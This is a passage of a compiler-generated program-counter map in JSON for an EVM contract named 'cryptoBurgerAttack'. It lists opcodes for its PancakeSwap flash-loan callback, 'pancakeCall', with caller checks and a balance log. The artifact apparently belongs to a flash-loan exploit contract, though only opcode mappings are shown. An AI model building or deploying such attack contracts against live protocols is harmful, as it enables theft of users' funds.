      "value": "0xCA143CE32FE78F1F7019D7D551A6402FC5350C73"
    },
    "389": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        631,
        673
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "390": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2270
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xE6A43905"
    },
    "395": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2270
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "396": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "398": {
      "op": "ADD"
    },
    "399": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "401": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "403": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "404": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "DUP1",
      "path": "0"
    },
    "405": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "DUP4",
      "path": "0"
    },
    "406": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "SUB",
      "path": "0"
    },
    "407": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "DUP2",
      "path": "0"
    },
    "408": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "DUP7",
      "path": "0"
    },
    "409": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "GAS",
      "path": "0"
    },
    "410": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "411": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "412": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "DUP1",
      "path": "0"
    },
    "413": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "414": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1AB"
    },
    "417": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "418": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "419": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "421": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "DUP1",
      "path": "0"
    },
    "422": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "423": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "424": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "426": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "REVERT",
      "path": "0"
    },
    "427": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "428": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "POP",
      "path": "0"
    },
    "429": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "POP",
      "path": "0"
    },
    "430": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "POP",
      "path": "0"
    },
    "431": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "POP",
      "path": "0"
    },
    "432": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "434": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "435": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "436": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "438": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "NOT",
      "path": "0"
    },
    "439": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "441": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "DUP3",
      "path": "0"
    },
    "442": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "ADD",
      "path": "0"
    },
    "443": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "AND",
      "path": "0"
    },
    "444": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "DUP3",
      "path": "0"
    },
    "445": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "ADD",
      "path": "0"
    },
    "446": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "DUP1",
      "path": "0"
    },
    "447": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "449": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "450": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "POP",
      "path": "0"
    },
    "451": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "DUP2",
      "path": "0"
    },
    "452": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "ADD",
      "path": "0"
    },
    "453": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "454": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1CF"
    },
    "457": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "458": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "459": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C59"
    },
    "462": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        2225,
        2320
      ],
      "op": "JUMP",
      "path": "0"
    },
    "463": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2225,
        2320
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "464": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2210,
        2320
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "465": {
      "op": "POP"
    },
    "466": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2339,
        2349
      ],
      "op": "CALLER",
      "path": "0",
      "statement": 0
    },
    "467": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "469": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "471": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "473": {
      "op": "SHL"
    },
    "474": {
      "op": "SUB"
    },
    "475": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2339,
        2357
      ],
      "op": "DUP3",
      "path": "0"
    },
    "476": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2339,
        2357
      ],
      "op": "AND",
      "path": "0"
    },
    "477": {
      "branch": 104,
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2339,
        2357
      ],
      "op": "EQ",
      "path": "0"
    },
    "478": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2331,
        2382
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x225"
    },
    "481": {
      "branch": 104,
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2331,
        2382
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "482": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2331,
        2382
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "484": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2331,
        2382
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "485": {
      "op": "PUSH3",
      "value": "0x461BCD"
    },
    "489": {
      "op": "PUSH1",
      "value": "0xE5"
    },
    "491": {
      "op": "SHL"
    },
    "492": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2331,
        2382
      ],
      "op": "DUP2",
      "path": "0"
    },
    "493": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2331,
        2382
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "494": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "496": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2331,
        2382
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "498": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2331,
        2382
      ],
      "op": "DUP3",
      "path": "0"
    },
    "499": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2331,
        2382
      ],
      "op": "ADD",
      "path": "0"
    },
    "500": {
      "op": "MSTORE"
    },
    "501": {
      "op": "PUSH1",
      "value": "0x14"
    },
    "503": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "505": {
      "op": "DUP3"
    },
    "506": {
      "op": "ADD"
    },
    "507": {
      "op": "MSTORE"
    },
    "508": {
      "op": "PUSH20",
      "value": "0x4E6F742061207061697220636F6E747261637421"
    },
    "529": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "531": {
      "op": "SHL"
    },
    "532": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "534": {
      "op": "DUP3"
    },
    "535": {
      "op": "ADD"
    },
    "536": {
      "op": "MSTORE"
    },
    "537": {
      "op": "PUSH1",
      "value": "0x64"
    },
    "539": {
      "op": "ADD"
    },
    "540": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2331,
        2382
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "541": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2331,
        2382
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "543": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2331,
        2382
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "544": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2331,
        2382
      ],
      "op": "DUP1",
      "path": "0"
    },
    "545": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2331,
        2382
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "546": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2331,
        2382
      ],
      "op": "SUB",
      "path": "0"
    },
    "547": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2331,
        2382
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "548": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2331,
        2382
      ],
      "op": "REVERT",
      "optimizer_revert": true,
      "path": "0"
    },
    "549": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2331,
        2382
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "550": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "552": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "554": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "556": {
      "op": "SHL"
    },
    "557": {
      "op": "SUB"
    },
    "558": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2400,
        2424
      ],
      "op": "DUP9",
      "path": "0",
      "statement": 1
    },
    "559": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2400,
        2424
      ],
      "op": "AND",
      "path": "0"
    },
    "560": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2419,
        2423
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "561": {
      "branch": 105,
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2400,
        2424
      ],
      "op": "EQ",
      "path": "0"
    },
    "562": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2392,
        2436
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x267"
    },
    "565": {
      "branch": 105,
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2392,
        2436
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "566": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2392,
        2436
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "568": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2392,
        2436
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "569": {
      "op": "PUSH3",
      "value": "0x461BCD"
    },
    "573": {
      "op": "PUSH1",
      "value": "0xE5"
    },
    "575": {
      "op": "SHL"
    },
    "576": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2392,
        2436
      ],
      "op": "DUP2",
      "path": "0"
    },
    "577": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2392,
        2436
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "578": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "580": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2392,
        2436
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "582": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2392,
        2436
      ],
      "op": "DUP3",
      "path": "0"
    },
    "583": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2392,
        2436
      ],
      "op": "ADD",
      "path": "0"
    },
    "584": {
      "op": "MSTORE"
    },
    "585": {
      "op": "PUSH1",
      "value": "0x7"
    },
    "587": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "589": {
      "op": "DUP3"
    },
    "590": {
      "op": "ADD"
    },
    "591": {
      "op": "MSTORE"
    },
    "592": {
      "op": "PUSH7",
      "value": "0x10B9B2B73232B9"
    },
    "600": {
      "op": "PUSH1",
      "value": "0xC9"
    },
    "602": {
      "op": "SHL"
    },
    "603": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "605": {
      "op": "DUP3"
    },
    "606": {
      "op": "ADD"
    },
    "607": {
      "op": "MSTORE"
    },
    "608": {
      "op": "PUSH1",
      "value": "0x64"
    },
    "610": {
      "op": "ADD"
    },
    "611": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2392,
        2436
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x21C"
    },
    "614": {
      "op": "JUMP"
    },
    "615": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2392,
        2436
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "616": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2448,
        2467
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "618": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2448,
        2467
      ],
      "op": "DUP1",
      "path": "0"
    },
    "619": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2487,
        2558
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x276"
    },
    "622": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2487,
        2558
      ],
      "op": "DUP7",
      "path": "0"
    },
    "623": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2487,
        2558
      ],
      "op": "DUP9",
      "path": "0"
    },
    "624": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2487,
        2558
      ],
      "op": "ADD",
      "path": "0"
    },
    "625": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2511,
        2516
      ],
      "op": "DUP9",
      "path": "0"
    },
    "626": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2487,
        2558
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C2D"
    },
    "629": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        2487,
        2558
      ],
      "op": "JUMP",
      "path": "0"
    },
    "630": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2487,
        2558
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "631": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2610,
        2659
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 2,
      "value": "0x40"
    },
    "633": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2610,
        2659
      ],
      "op": "DUP1",
      "path": "0"
    },
    "634": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2610,
        2659
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "635": {
      "op": "DUP2"
    },
    "636": {
      "op": "DUP2"
    },
    "637": {
      "op": "MSTORE"
    },
    "638": {
      "op": "PUSH1",
      "value": "0x13"
    },
    "640": {
      "op": "DUP2"
    },
    "641": {
      "op": "DUP4"
    },
    "642": {
      "op": "ADD"
    },
    "643": {
      "op": "MSTORE"
    },
    "644": {
      "op": "PUSH19",
      "value": "0x436F6E74726163742062616C616E6365206973"
    },
    "664": {
      "op": "PUSH1",
      "value": "0x68"
    },
    "666": {
      "op": "SHL"
    },
    "667": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "669": {
      "op": "DUP3"
    },
    "670": {
      "op": "ADD"
    },
    "671": {
      "op": "MSTORE"
    },
    "672": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2637,
        2658
      ],
      "op": "SELFBALANCE",
      "path": "0"
    },
    "673": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "675": {
      "op": "DUP3"
    },
    "676": {
      "op": "ADD"
    },
    "677": {
      "op": "MSTORE"
    },
    "678": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2610,
        2659
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "679": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2610,
        2659
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "680": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2447,
        2558
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "681": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2447,
        2558
      ],
      "op": "SWAP5",
      "path": "0"
    },
    "682": {
      "op": "POP"
    },
    "683": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2447,
        2558
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "684": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2447,
        2558
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "685": {
      "op": "POP"
    },
    "686": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "688": {
      "op": "DUP1"
    },
    "689": {
      "op": "MLOAD"
    },
    "690": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "692": {
      "op": "PUSH2",
      "value": "0x2FFE"
    },
    "695": {
      "op": "DUP4"
    },
    "696": {
      "op": "CODECOPY"
    },
    "697": {
      "op": "DUP2"
    },
    "698": {
      "op": "MLOAD"
    },
    "699": {
      "op": "SWAP2"
    },
    "700": {
      "op": "MSTORE"
    },
    "701": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2610,
        2659
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "702": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2610,
        2659
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "703": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2610,
        2659
      ],
      "op": "DUP2",
      "path": "0"
    },
    "704": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2610,
        2659
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "705": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2610,
        2659
      ],
      "op": "SUB",
      "path": "0"
    },
    "706": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "708": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2610,
        2659
      ],
      "op": "ADD",
      "path": "0"
    },
    "709": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2610,
        2659
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "710": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2610,
        2659
      ],
      "op": "LOG1",
      "path": "0"
    },
    "711": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2786,
        2802
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 3,
      "value": "0x40"
    },
    "713": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2786,
        2802
      ],
      "op": "DUP1",
      "path": "0"
    },
    "714": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2786,
        2802
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "715": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2800,
        2801
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x2"
    },
    "717": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2786,
        2802
      ],
      "op": "DUP1",
      "path": "0"
    },
    "718": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2786,
        2802
      ],
      "op": "DUP3",
      "path": "0"
    },
    "719": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2786,
        2802
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "720": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2748,
        2769
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x60"
    },
    "722": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2786,
        2802
      ],
      "op": "DUP1",
      "path": "0"
    },
    "723": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2786,
        2802
      ],
      "op": "DUP4",
      "path": "0"
    },
    "724": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2786,
        2802
      ],
      "op": "ADD",
      "path": "0"
    },
    "725": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2786,
        2802
      ],
      "op": "DUP5",
      "path": "0"
    },
    "726": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2786,
        2802
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "727": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2725,
        2737
      ],
      "op": "PUSH10",
      "path": "0",
      "value": "0x43C25E0DCC1BD1C0000"
    },
    "738": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2725,
        2737
      ],
      "op": "SWAP4",
      "path": "0"
    },
    "739": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2748,
        2769
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "740": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2748,
        2769
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "741": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2786,
        2802
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "742": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2800,
        2801
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "743": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2786,
        2802
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "745": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2786,
        2802
      ],
      "op": "DUP4",
      "path": "0"
    },
    "746": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2786,
        2802
      ],
      "op": "ADD",
      "path": "0"
    },
    "747": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2786,
        2802
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "748": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2786,
        2802
      ],
      "op": "DUP1",
      "path": "0"
    },
    "749": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2786,
        2802
      ],
      "op": "CALLDATASIZE",
      "path": "0"
    },
    "750": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2786,
        2802
      ],
      "op": "DUP4",
      "path": "0"
    },
    "751": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2786,
        2802
      ],
      "op": "CALLDATACOPY",
      "path": "0"
    },
    "752": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2786,
        2802
      ],
      "op": "ADD",
      "path": "0"
    },
    "753": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2786,
        2802
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "754": {
      "op": "POP"
    },
    "755": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2786,
        2802
      ],
      "op": "POP",
      "path": "0"
    },
    "756": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2779,
        2802
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "757": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2779,
        2802
      ],
      "op": "POP",
      "path": "0"
    },
    "758": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "760": {
      "op": "DUP1"
    },
    "761": {
      "op": "MLOAD"
    },
    "762": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "764": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "767": {
      "op": "DUP4"
    },
    "768": {
      "op": "CODECOPY"
    },
    "769": {
      "op": "DUP2"
    },
    "770": {
      "op": "MLOAD"
    },
    "771": {
      "op": "SWAP2"
    },
    "772": {
      "op": "MSTORE"
    },
    "773": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2813,
        2817
      ],
      "op": "DUP2",
      "path": "0",
      "statement": 4
    },
    "774": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2818,
        2819
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "776": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2813,
        2820
      ],
      "op": "DUP2",
      "path": "0"
    },
    "777": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2813,
        2820
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "778": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2813,
        2820
      ],
      "op": "DUP2",
      "path": "0"
    },
    "779": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2813,
        2820
      ],
      "op": "LT",
      "path": "0"
    },
    "780": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2813,
        2820
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x317"
    },
    "783": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2813,
        2820
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "784": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2813,
        2820
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x317"
    },
    "787": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2813,
        2820
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
